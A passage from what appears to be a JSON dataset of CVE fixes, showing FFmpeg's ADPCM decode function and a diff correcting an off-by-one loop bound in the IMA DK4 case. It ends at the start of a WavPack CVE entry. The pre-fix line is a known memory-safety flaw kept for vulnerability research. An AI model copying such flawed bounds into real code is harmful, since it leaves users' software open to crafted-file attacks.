AVERROR_INVALIDDATA;\n    }\n\n    *got_frame_ptr   = 1;\n    *(AVFrame *)data = c->frame;\n\n    return bytestream2_tell(&gb);\n}",
        "func": "static int adpcm_decode_frame(AVCodecContext *avctx, void *data,\n                              int *got_frame_ptr, AVPacket *avpkt)\n{\n    const uint8_t *buf = avpkt->data;\n    int buf_size = avpkt->size;\n    ADPCMDecodeContext *c = avctx->priv_data;\n    ADPCMChannelStatus *cs;\n    int n, m, channel, i;\n    short *samples;\n    int16_t **samples_p;\n    int st; /* stereo */\n    int count1, count2;\n    int nb_samples, coded_samples, ret;\n    GetByteContext gb;\n\n    bytestream2_init(&gb, buf, buf_size);\n    nb_samples = get_nb_samples(avctx, &gb, buf_size, &coded_samples);\n    if (nb_samples <= 0) {\n        av_log(avctx, AV_LOG_ERROR, \"invalid number of samples in packet\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n\n    /* get output buffer */\n    c->frame.nb_samples = nb_samples;\n    if ((ret = ff_get_buffer(avctx, &c->frame)) < 0) {\n        av_log(avctx, AV_LOG_ERROR, \"get_buffer() failed\\n\");\n        return ret;\n    }\n    samples = (short *)c->frame.data[0];\n    samples_p = (int16_t **)c->frame.extended_data;\n\n    /* use coded_samples when applicable */\n    /* it is always <= nb_samples, so the output buffer will be large enough */\n    if (coded_samples) {\n        if (coded_samples != nb_samples)\n            av_log(avctx, AV_LOG_WARNING, \"mismatch in coded sample count\\n\");\n        c->frame.nb_samples = nb_samples = coded_samples;\n    }\n\n    st = avctx->channels == 2 ? 1 : 0;\n\n    switch(avctx->codec->id) {\n    case AV_CODEC_ID_ADPCM_IMA_QT:\n        /* In QuickTime, IMA is encoded by chunks of 34 bytes (=64 samples).\n           Channel data is interleaved per-chunk. */\n        for (channel = 0; channel < avctx->channels; channel++) {\n            int predictor;\n            int step_index;\n            cs = &(c->status[channel]);\n            /* (pppppp) (piiiiiii) */\n\n            /* Bits 15-7 are the _top_ 9 bits of the 16-bit initial predictor value */\n            predictor = sign_extend(bytestream2_get_be16u(&gb), 16);\n            step_index = predictor & 0x7F;\n            predictor &= ~0x7F;\n\n            if (cs->step_index == step_index) {\n                int diff = predictor - cs->predictor;\n                if (diff < 0)\n                    diff = - diff;\n                if (diff > 0x7f)\n                    goto update;\n            } else {\n            update:\n                cs->step_index = step_index;\n                cs->predictor = predictor;\n            }\n\n            if (cs->step_index > 88u){\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       channel, cs->step_index);\n                return AVERROR_INVALIDDATA;\n            }\n\n            samples = samples_p[channel];\n\n            for (m = 0; m < 64; m += 2) {\n                int byte = bytestream2_get_byteu(&gb);\n                samples[m    ] = adpcm_ima_qt_expand_nibble(cs, byte & 0x0F, 3);\n                samples[m + 1] = adpcm_ima_qt_expand_nibble(cs, byte >> 4  , 3);\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_WAV:\n        for(i=0; i<avctx->channels; i++){\n            cs = &(c->status[i]);\n            cs->predictor = samples_p[i][0] = sign_extend(bytestream2_get_le16u(&gb), 16);\n\n            cs->step_index = sign_extend(bytestream2_get_le16u(&gb), 16);\n            if (cs->step_index > 88u){\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       i, cs->step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n\n        for (n = 0; n < (nb_samples - 1) / 8; n++) {\n            for (i = 0; i < avctx->channels; i++) {\n                cs = &c->status[i];\n                samples = &samples_p[i][1 + n * 8];\n                for (m = 0; m < 8; m += 2) {\n                    int v = bytestream2_get_byteu(&gb);\n                    samples[m    ] = adpcm_ima_expand_nibble(cs, v & 0x0F, 3);\n                    samples[m + 1] = adpcm_ima_expand_nibble(cs, v >> 4  , 3);\n                }\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_4XM:\n        for (i = 0; i < avctx->channels; i++)\n            c->status[i].predictor = sign_extend(bytestream2_get_le16u(&gb), 16);\n\n        for (i = 0; i < avctx->channels; i++) {\n            c->status[i].step_index = sign_extend(bytestream2_get_le16u(&gb), 16);\n            if (c->status[i].step_index > 88u) {\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       i, c->status[i].step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n\n        for (i = 0; i < avctx->channels; i++) {\n            samples = (int16_t *)c->frame.data[i];\n            cs = &c->status[i];\n            for (n = nb_samples >> 1; n > 0; n--) {\n                int v = bytestream2_get_byteu(&gb);\n                *samples++ = adpcm_ima_expand_nibble(cs, v & 0x0F, 4);\n                *samples++ = adpcm_ima_expand_nibble(cs, v >> 4  , 4);\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_MS:\n    {\n        int block_predictor;\n\n        block_predictor = bytestream2_get_byteu(&gb);\n        if (block_predictor > 6) {\n            av_log(avctx, AV_LOG_ERROR, \"ERROR: block_predictor[0] = %d\\n\",\n                   block_predictor);\n            return AVERROR_INVALIDDATA;\n        }\n        c->status[0].coeff1 = ff_adpcm_AdaptCoeff1[block_predictor];\n        c->status[0].coeff2 = ff_adpcm_AdaptCoeff2[block_predictor];\n        if (st) {\n            block_predictor = bytestream2_get_byteu(&gb);\n            if (block_predictor > 6) {\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: block_predictor[1] = %d\\n\",\n                       block_predictor);\n                return AVERROR_INVALIDDATA;\n            }\n            c->status[1].coeff1 = ff_adpcm_AdaptCoeff1[block_predictor];\n            c->status[1].coeff2 = ff_adpcm_AdaptCoeff2[block_predictor];\n        }\n        c->status[0].idelta = sign_extend(bytestream2_get_le16u(&gb), 16);\n        if (st){\n            c->status[1].idelta = sign_extend(bytestream2_get_le16u(&gb), 16);\n        }\n\n        c->status[0].sample1 = sign_extend(bytestream2_get_le16u(&gb), 16);\n        if (st) c->status[1].sample1 = sign_extend(bytestream2_get_le16u(&gb), 16);\n        c->status[0].sample2 = sign_extend(bytestream2_get_le16u(&gb), 16);\n        if (st) c->status[1].sample2 = sign_extend(bytestream2_get_le16u(&gb), 16);\n\n        *samples++ = c->status[0].sample2;\n        if (st) *samples++ = c->status[1].sample2;\n        *samples++ = c->status[0].sample1;\n        if (st) *samples++ = c->status[1].sample1;\n        for(n = (nb_samples - 2) >> (1 - st); n > 0; n--) {\n            int byte = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ms_expand_nibble(&c->status[0 ], byte >> 4  );\n            *samples++ = adpcm_ms_expand_nibble(&c->status[st], byte & 0x0F);\n        }\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_IMA_DK4:\n        for (channel = 0; channel < avctx->channels; channel++) {\n            cs = &c->status[channel];\n            cs->predictor  = *samples++ = sign_extend(bytestream2_get_le16u(&gb), 16);\n            cs->step_index = sign_extend(bytestream2_get_le16u(&gb), 16);\n            if (cs->step_index > 88u){\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       channel, cs->step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n        for (n = (nb_samples - 1) >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0 ], v >> 4  , 3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], v & 0x0F, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_DK3:\n    {\n        int last_byte = 0;\n        int nibble;\n        int decode_top_nibble_next = 0;\n        int diff_channel;\n        const int16_t *samples_end = samples + avctx->channels * nb_samples;\n\n        bytestream2_skipu(&gb, 10);\n        c->status[0].predictor  = sign_extend(bytestream2_get_le16u(&gb), 16);\n        c->status[1].predictor  = sign_extend(bytestream2_get_le16u(&gb), 16);\n        c->status[0].step_index = bytestream2_get_byteu(&gb);\n        c->status[1].step_index = bytestream2_get_byteu(&gb);\n        if (c->status[0].step_index > 88u || c->status[1].step_index > 88u){\n            av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index = %i/%i\\n\",\n                   c->status[0].step_index, c->status[1].step_index);\n            return AVERROR_INVALIDDATA;\n        }\n        /* sign extend the predictors */\n        diff_channel = c->status[1].predictor;\n\n        /* DK3 ADPCM support macro */\n#define DK3_GET_NEXT_NIBBLE() \\\n    if (decode_top_nibble_next) { \\\n        nibble = last_byte >> 4; \\\n        decode_top_nibble_next = 0; \\\n    } else { \\\n        last_byte = bytestream2_get_byteu(&gb); \\\n        nibble = last_byte & 0x0F; \\\n        decode_top_nibble_next = 1; \\\n    }\n\n        while (samples < samples_end) {\n\n            /* for this algorithm, c->status[0] is the sum channel and\n             * c->status[1] is the diff channel */\n\n            /* process the first predictor of the sum channel */\n            DK3_GET_NEXT_NIBBLE();\n            adpcm_ima_expand_nibble(&c->status[0], nibble, 3);\n\n            /* process the diff channel predictor */\n            DK3_GET_NEXT_NIBBLE();\n            adpcm_ima_expand_nibble(&c->status[1], nibble, 3);\n\n            /* process the first pair of stereo PCM samples */\n            diff_channel = (diff_channel + c->status[1].predictor) / 2;\n            *samples++ = c->status[0].predictor + c->status[1].predictor;\n            *samples++ = c->status[0].predictor - c->status[1].predictor;\n\n            /* process the second predictor of the sum channel */\n            DK3_GET_NEXT_NIBBLE();\n            adpcm_ima_expand_nibble(&c->status[0], nibble, 3);\n\n            /* process the second pair of stereo PCM samples */\n            diff_channel = (diff_channel + c->status[1].predictor) / 2;\n            *samples++ = c->status[0].predictor + c->status[1].predictor;\n            *samples++ = c->status[0].predictor - c->status[1].predictor;\n        }\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_IMA_ISS:\n        for (channel = 0; channel < avctx->channels; channel++) {\n            cs = &c->status[channel];\n            cs->predictor  = sign_extend(bytestream2_get_le16u(&gb), 16);\n            cs->step_index = sign_extend(bytestream2_get_le16u(&gb), 16);\n            if (cs->step_index > 88u){\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       channel, cs->step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v1, v2;\n            int v = bytestream2_get_byteu(&gb);\n            /* nibbles are swapped for mono */\n            if (st) {\n                v1 = v >> 4;\n                v2 = v & 0x0F;\n            } else {\n                v2 = v >> 4;\n                v1 = v & 0x0F;\n            }\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0 ], v1, 3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], v2, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_APC:\n        while (bytestream2_get_bytes_left(&gb) > 0) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0],  v >> 4  , 3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], v & 0x0F, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_OKI:\n        while (bytestream2_get_bytes_left(&gb) > 0) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_oki_expand_nibble(&c->status[0],  v >> 4  );\n            *samples++ = adpcm_ima_oki_expand_nibble(&c->status[st], v & 0x0F);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_WS:\n        if (c->vqa_version == 3) {\n            for (channel = 0; channel < avctx->channels; channel++) {\n                int16_t *smp = samples_p[channel];\n\n                for (n = nb_samples / 2; n > 0; n--) {\n                    int v = bytestream2_get_byteu(&gb);\n                    *smp++ = adpcm_ima_expand_nibble(&c->status[channel], v >> 4  , 3);\n                    *smp++ = adpcm_ima_expand_nibble(&c->status[channel], v & 0x0F, 3);\n                }\n            }\n        } else {\n            for (n = nb_samples / 2; n > 0; n--) {\n                for (channel = 0; channel < avctx->channels; channel++) {\n                    int v = bytestream2_get_byteu(&gb);\n                    *samples++  = adpcm_ima_expand_nibble(&c->status[channel], v >> 4  , 3);\n                    samples[st] = adpcm_ima_expand_nibble(&c->status[channel], v & 0x0F, 3);\n                }\n                samples += avctx->channels;\n            }\n        }\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    case AV_CODEC_ID_ADPCM_XA:\n    {\n        int16_t *out0 = samples_p[0];\n        int16_t *out1 = samples_p[1];\n        int samples_per_block = 28 * (3 - avctx->channels) * 4;\n        int sample_offset = 0;\n        while (bytestream2_get_bytes_left(&gb) >= 128) {\n            if ((ret = xa_decode(avctx, out0, out1, buf + bytestream2_tell(&gb),\n                                 &c->status[0], &c->status[1],\n                                 avctx->channels, sample_offset)) < 0)\n                return ret;\n            bytestream2_skipu(&gb, 128);\n            sample_offset += samples_per_block;\n        }\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_IMA_EA_EACS:\n        for (i=0; i<=st; i++) {\n            c->status[i].step_index = bytestream2_get_le32u(&gb);\n            if (c->status[i].step_index > 88u) {\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       i, c->status[i].step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n        for (i=0; i<=st; i++)\n            c->status[i].predictor  = bytestream2_get_le32u(&gb);\n\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int byte   = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0],  byte >> 4,   3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], byte & 0x0F, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_EA_SEAD:\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int byte = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0],  byte >> 4,   6);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], byte & 0x0F, 6);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_EA:\n    {\n        int previous_left_sample, previous_right_sample;\n        int current_left_sample, current_right_sample;\n        int next_left_sample, next_right_sample;\n        int coeff1l, coeff2l, coeff1r, coeff2r;\n        int shift_left, shift_right;\n\n        /* Each EA ADPCM frame has a 12-byte header followed by 30-byte pieces,\n           each coding 28 stereo samples. */\n\n        if(avctx->channels != 2)\n            return AVERROR_INVALIDDATA;\n\n        current_left_sample   = sign_extend(bytestream2_get_le16u(&gb), 16);\n        previous_left_sample  = sign_extend(bytestream2_get_le16u(&gb), 16);\n        current_right_sample  = sign_extend(bytestream2_get_le16u(&gb), 16);\n        previous_right_sample = sign_extend(bytestream2_get_le16u(&gb), 16);\n\n        for (count1 = 0; count1 < nb_samples / 28; count1++) {\n            int byte = bytestream2_get_byteu(&gb);\n            coeff1l = ea_adpcm_table[ byte >> 4       ];\n            coeff2l = ea_adpcm_table[(byte >> 4  ) + 4];\n            coeff1r = ea_adpcm_table[ byte & 0x0F];\n            coeff2r = ea_adpcm_table[(byte & 0x0F) + 4];\n\n            byte = bytestream2_get_byteu(&gb);\n            shift_left  = 20 - (byte >> 4);\n            shift_right = 20 - (byte & 0x0F);\n\n            for (count2 = 0; count2 < 28; count2++) {\n                byte = bytestream2_get_byteu(&gb);\n                next_left_sample  = sign_extend(byte >> 4, 4) << shift_left;\n                next_right_sample = sign_extend(byte,      4) << shift_right;\n\n                next_left_sample = (next_left_sample +\n                    (current_left_sample * coeff1l) +\n                    (previous_left_sample * coeff2l) + 0x80) >> 8;\n                next_right_sample = (next_right_sample +\n                    (current_right_sample * coeff1r) +\n                    (previous_right_sample * coeff2r) + 0x80) >> 8;\n\n                previous_left_sample = current_left_sample;\n                current_left_sample = av_clip_int16(next_left_sample);\n                previous_right_sample = current_right_sample;\n                current_right_sample = av_clip_int16(next_right_sample);\n                *samples++ = current_left_sample;\n                *samples++ = current_right_sample;\n            }\n        }\n\n        bytestream2_skip(&gb, 2); // Skip terminating 0x0000\n\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_EA_MAXIS_XA:\n    {\n        int coeff[2][2], shift[2];\n\n        for(channel = 0; channel < avctx->channels; channel++) {\n            int byte = bytestream2_get_byteu(&gb);\n            for (i=0; i<2; i++)\n                coeff[channel][i] = ea_adpcm_table[(byte >> 4) + 4*i];\n            shift[channel] = 20 - (byte & 0x0F);\n        }\n        for (count1 = 0; count1 < nb_samples / 2; count1++) {\n            int byte[2];\n\n            byte[0] = bytestream2_get_byteu(&gb);\n            if (st) byte[1] = bytestream2_get_byteu(&gb);\n            for(i = 4; i >= 0; i-=4) { /* Pairwise samples LL RR (st) or LL LL (mono) */\n                for(channel = 0; channel < avctx->channels; channel++) {\n                    int sample = sign_extend(byte[channel] >> i, 4) << shift[channel];\n                    sample = (sample +\n                             c->status[channel].sample1 * coeff[channel][0] +\n                             c->status[channel].sample2 * coeff[channel][1] + 0x80) >> 8;\n                    c->status[channel].sample2 = c->status[channel].sample1;\n                    c->status[channel].sample1 = av_clip_int16(sample);\n                    *samples++ = c->status[channel].sample1;\n                }\n            }\n        }\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_EA_R1:\n    case AV_CODEC_ID_ADPCM_EA_R2:\n    case AV_CODEC_ID_ADPCM_EA_R3: {\n        /* channel numbering\n           2chan: 0=fl, 1=fr\n           4chan: 0=fl, 1=rl, 2=fr, 3=rr\n           6chan: 0=fl, 1=c,  2=fr, 3=rl,  4=rr, 5=sub */\n        const int big_endian = avctx->codec->id == AV_CODEC_ID_ADPCM_EA_R3;\n        int previous_sample, current_sample, next_sample;\n        int coeff1, coeff2;\n        int shift;\n        unsigned int channel;\n        uint16_t *samplesC;\n        int count = 0;\n        int offsets[6];\n\n        for (channel=0; channel<avctx->channels; channel++)\n            offsets[channel] = (big_endian ? bytestream2_get_be32(&gb) :\n                                             bytestream2_get_le32(&gb)) +\n                               (avctx->channels + 1) * 4;\n\n        for (channel=0; channel<avctx->channels; channel++) {\n            bytestream2_seek(&gb, offsets[channel], SEEK_SET);\n            samplesC = samples_p[channel];\n\n            if (avctx->codec->id == AV_CODEC_ID_ADPCM_EA_R1) {\n                current_sample  = sign_extend(bytestream2_get_le16(&gb), 16);\n                previous_sample = sign_extend(bytestream2_get_le16(&gb), 16);\n            } else {\n                current_sample  = c->status[channel].predictor;\n                previous_sample = c->status[channel].prev_sample;\n            }\n\n            for (count1 = 0; count1 < nb_samples / 28; count1++) {\n                int byte = bytestream2_get_byte(&gb);\n                if (byte == 0xEE) {  /* only seen in R2 and R3 */\n                    current_sample  = sign_extend(bytestream2_get_be16(&gb), 16);\n                    previous_sample = sign_extend(bytestream2_get_be16(&gb), 16);\n\n                    for (count2=0; count2<28; count2++)\n                        *samplesC++ = sign_extend(bytestream2_get_be16(&gb), 16);\n                } else {\n                    coeff1 = ea_adpcm_table[ byte >> 4     ];\n                    coeff2 = ea_adpcm_table[(byte >> 4) + 4];\n                    shift = 20 - (byte & 0x0F);\n\n                    for (count2=0; count2<28; count2++) {\n                        if (count2 & 1)\n                            next_sample = sign_extend(byte,    4) << shift;\n                        else {\n                            byte = bytestream2_get_byte(&gb);\n                            next_sample = sign_extend(byte >> 4, 4) << shift;\n                        }\n\n                        next_sample += (current_sample  * coeff1) +\n                                       (previous_sample * coeff2);\n                        next_sample = av_clip_int16(next_sample >> 8);\n\n                        previous_sample = current_sample;\n                        current_sample  = next_sample;\n                        *samplesC++ = current_sample;\n                    }\n                }\n            }\n            if (!count) {\n                count = count1;\n            } else if (count != count1) {\n                av_log(avctx, AV_LOG_WARNING, \"per-channel sample count mismatch\\n\");\n                count = FFMAX(count, count1);\n            }\n\n            if (avctx->codec->id != AV_CODEC_ID_ADPCM_EA_R1) {\n                c->status[channel].predictor   = current_sample;\n                c->status[channel].prev_sample = previous_sample;\n            }\n        }\n\n        c->frame.nb_samples = count * 28;\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_EA_XAS:\n        for (channel=0; channel<avctx->channels; channel++) {\n            int coeff[2][4], shift[4];\n            int16_t *s = samples_p[channel];\n            for (n = 0; n < 4; n++, s += 32) {\n                int val = sign_extend(bytestream2_get_le16u(&gb), 16);\n                for (i=0; i<2; i++)\n                    coeff[i][n] = ea_adpcm_table[(val&0x0F)+4*i];\n                s[0] = val & ~0x0F;\n\n                val = sign_extend(bytestream2_get_le16u(&gb), 16);\n                shift[n] = 20 - (val & 0x0F);\n                s[1] = val & ~0x0F;\n            }\n\n            for (m=2; m<32; m+=2) {\n                s = &samples_p[channel][m];\n                for (n = 0; n < 4; n++, s += 32) {\n                    int level, pred;\n                    int byte = bytestream2_get_byteu(&gb);\n\n                    level = sign_extend(byte >> 4, 4) << shift[n];\n                    pred  = s[-1] * coeff[0][n] + s[-2] * coeff[1][n];\n                    s[0]  = av_clip_int16((level + pred + 0x80) >> 8);\n\n                    level = sign_extend(byte, 4) << shift[n];\n                    pred  = s[0] * coeff[0][n] + s[-1] * coeff[1][n];\n                    s[1]  = av_clip_int16((level + pred + 0x80) >> 8);\n                }\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_AMV:\n        c->status[0].predictor = sign_extend(bytestream2_get_le16u(&gb), 16);\n        c->status[0].step_index = bytestream2_get_le16u(&gb);\n        bytestream2_skipu(&gb, 4);\n        if (c->status[0].step_index > 88u) {\n            av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index = %i\\n\",\n                   c->status[0].step_index);\n            return AVERROR_INVALIDDATA;\n        }\n\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0], v >> 4, 3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0], v & 0xf, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_SMJPEG:\n        for (i = 0; i < avctx->channels; i++) {\n            c->status[i].predictor = sign_extend(bytestream2_get_be16u(&gb), 16);\n            c->status[i].step_index = bytestream2_get_byteu(&gb);\n            bytestream2_skipu(&gb, 1);\n            if (c->status[i].step_index > 88u) {\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index = %i\\n\",\n                       c->status[i].step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n\n            *samples++ = adpcm_ima_qt_expand_nibble(&c->status[0 ], v >> 4, 3);\n            *samples++ = adpcm_ima_qt_expand_nibble(&c->status[st], v & 0xf, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_CT:\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ct_expand_nibble(&c->status[0 ], v >> 4  );\n            *samples++ = adpcm_ct_expand_nibble(&c->status[st], v & 0x0F);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_SBPRO_4:\n    case AV_CODEC_ID_ADPCM_SBPRO_3:\n    case AV_CODEC_ID_ADPCM_SBPRO_2:\n        if (!c->status[0].step_index) {\n            /* the first byte is a raw sample */\n            *samples++ = 128 * (bytestream2_get_byteu(&gb) - 0x80);\n            if (st)\n                *samples++ = 128 * (bytestream2_get_byteu(&gb) - 0x80);\n            c->status[0].step_index = 1;\n            nb_samples--;\n        }\n        if (avctx->codec->id == AV_CODEC_ID_ADPCM_SBPRO_4) {\n            for (n = nb_samples >> (1 - st); n > 0; n--) {\n                int byte = bytestream2_get_byteu(&gb);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                       byte >> 4,   4, 0);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[st],\n                                                       byte & 0x0F, 4, 0);\n            }\n        } else if (avctx->codec->id == AV_CODEC_ID_ADPCM_SBPRO_3) {\n            for (n = nb_samples / 3; n > 0; n--) {\n                int byte = bytestream2_get_byteu(&gb);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                        byte >> 5        , 3, 0);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                       (byte >> 2) & 0x07, 3, 0);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                        byte & 0x03,       2, 0);\n            }\n        } else {\n            for (n = nb_samples >> (2 - st); n > 0; n--) {\n                int byte = bytestream2_get_byteu(&gb);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                        byte >> 6        , 2, 2);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[st],\n                                                       (byte >> 4) & 0x03, 2, 2);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                       (byte >> 2) & 0x03, 2, 2);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[st],\n                                                        byte & 0x03,       2, 2);\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_SWF:\n        adpcm_swf_decode(avctx, buf, buf_size, samples);\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    case AV_CODEC_ID_ADPCM_YAMAHA:\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_yamaha_expand_nibble(&c->status[0 ], v & 0x0F);\n            *samples++ = adpcm_yamaha_expand_nibble(&c->status[st], v >> 4  );\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_AFC:\n    {\n        int samples_per_block;\n        int blocks;\n\n        if (avctx->extradata && avctx->extradata_size == 1 && avctx->extradata[0]) {\n            samples_per_block = avctx->extradata[0] / 16;\n            blocks = nb_samples / avctx->extradata[0];\n        } else {\n            samples_per_block = nb_samples / 16;\n            blocks = 1;\n        }\n\n        for (m = 0; m < blocks; m++) {\n        for (channel = 0; channel < avctx->channels; channel++) {\n            int prev1 = c->status[channel].sample1;\n            int prev2 = c->status[channel].sample2;\n\n            samples = samples_p[channel] + m * 16;\n            /* Read in every sample for this channel.  */\n            for (i = 0; i < samples_per_block; i++) {\n                int byte = bytestream2_get_byteu(&gb);\n                int scale = 1 << (byte >> 4);\n                int index = byte & 0xf;\n                int factor1 = ff_adpcm_afc_coeffs[0][index];\n                int factor2 = ff_adpcm_afc_coeffs[1][index];\n\n                /* Decode 16 samples.  */\n                for (n = 0; n < 16; n++) {\n                    int32_t sampledat;\n\n                    if (n & 1) {\n                        sampledat = sign_extend(byte, 4);\n                    } else {\n                        byte = bytestream2_get_byteu(&gb);\n                        sampledat = sign_extend(byte >> 4, 4);\n                    }\n\n                    sampledat = ((prev1 * factor1 + prev2 * factor2) +\n                                 ((sampledat * scale) << 11)) >> 11;\n                    *samples = av_clip_int16(sampledat);\n                    prev2 = prev1;\n                    prev1 = *samples++;\n                }\n            }\n\n            c->status[channel].sample1 = prev1;\n            c->status[channel].sample2 = prev2;\n        }\n        }\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_THP:\n    {\n        int table[6][16];\n        int ch;\n\n        for (i = 0; i < avctx->channels; i++)\n            for (n = 0; n < 16; n++)\n                table[i][n] = sign_extend(bytestream2_get_be16u(&gb), 16);\n\n        /* Initialize the previous sample.  */\n        for (i = 0; i < avctx->channels; i++) {\n            c->status[i].sample1 = sign_extend(bytestream2_get_be16u(&gb), 16);\n            c->status[i].sample2 = sign_extend(bytestream2_get_be16u(&gb), 16);\n        }\n\n        for (ch = 0; ch < avctx->channels; ch++) {\n            samples = samples_p[ch];\n\n            /* Read in every sample for this channel.  */\n            for (i = 0; i < nb_samples / 14; i++) {\n                int byte = bytestream2_get_byteu(&gb);\n                int index = (byte >> 4) & 7;\n                unsigned int exp = byte & 0x0F;\n                int factor1 = table[ch][index * 2];\n                int factor2 = table[ch][index * 2 + 1];\n\n                /* Decode 14 samples.  */\n                for (n = 0; n < 14; n++) {\n                    int32_t sampledat;\n\n                    if (n & 1) {\n                        sampledat = sign_extend(byte, 4);\n                    } else {\n                        byte = bytestream2_get_byteu(&gb);\n                        sampledat = sign_extend(byte >> 4, 4);\n                    }\n\n                    sampledat = ((c->status[ch].sample1 * factor1\n                                + c->status[ch].sample2 * factor2) >> 11) + (sampledat << exp);\n                    *samples = av_clip_int16(sampledat);\n                    c->status[ch].sample2 = c->status[ch].sample1;\n                    c->status[ch].sample1 = *samples++;\n                }\n            }\n        }\n        break;\n    }\n\n    default:\n        return -1;\n    }\n\n    if (avpkt->size && bytestream2_tell(&gb) == 0) {\n        av_log(avctx, AV_LOG_ERROR, \"Nothing consumed\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n\n    *got_frame_ptr   = 1;\n    *(AVFrame *)data = c->frame;\n\n    return bytestream2_tell(&gb);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -183,7 +183,7 @@\n                 return AVERROR_INVALIDDATA;\n             }\n         }\n-        for (n = nb_samples >> (1 - st); n > 0; n--) {\n+        for (n = (nb_samples - 1) >> (1 - st); n > 0; n--) {\n             int v = bytestream2_get_byteu(&gb);\n             *samples++ = adpcm_ima_expand_nibble(&c->status[0 ], v >> 4  , 3);\n             *samples++ = adpcm_ima_expand_nibble(&c->status[st], v & 0x0F, 3);",
        "diff_line_info": {
            "deleted_lines": [
                "        for (n = nb_samples >> (1 - st); n > 0; n--) {"
            ],
            "added_lines": [
                "        for (n = (nb_samples - 1) >> (1 - st); n > 0; n--) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0853",
        "func_name": "ffmpeg/wavpack_decode_frame",
        "description": "The wavpack_decode_frame function in libavcodec/wavpack.c in FFmpeg before 1.1 allows remote attackers to have an unspecified impact via crafted WavPack data, which triggers an out-of-bounds array access, possibly due to an off-by-one error.",
